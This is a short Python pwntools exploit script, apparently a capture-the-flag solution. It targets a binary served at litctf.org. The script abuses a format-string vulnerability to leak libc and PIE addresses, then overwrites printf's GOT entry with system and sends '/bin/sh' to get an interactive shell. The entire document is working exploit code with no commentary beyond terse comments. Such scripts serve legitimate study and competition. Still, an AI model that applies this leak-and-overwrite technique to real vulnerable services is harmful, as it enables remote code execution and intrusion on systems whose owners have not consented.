#!/usr/bin/env python3
from pwn import *

e = ELF("main")
libc = ELF("libc-2.31.so")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("litctf.org", 31772)
	elif args.GDB:
		return gdb.debug(e.path, "b *(main+134)\nb *(main+139)\nc")
	else:
		return process(e.path)

if __name__ == '__main__':
	r = conn()
	r.recv()
	# leak libc addr
	r.sendline(b'%41$p')
	libc.address = int(r.recvlineS(), 16) - libc.sym['__libc_start_main'] - 243
	log.info("LIBC ADDR @ " + hex(libc.address))
	assert libc.address & 0xfff == 0
	# leak PIE
	r.sendline(b'%45$p')
	e.address = int(r.recvlineS(), 16) - e.sym['main']
	log.info("VULN ADDR @ " + hex(e.address))
	assert e.address & 0xfff == 0
	# overwrite GOT
	r.sendline(fmtstr_payload(6, {e.got['printf'] : libc.sym['system']}))
	r.recv()
	r.sendline(b'/bin/sh\0')
	r.interactive()
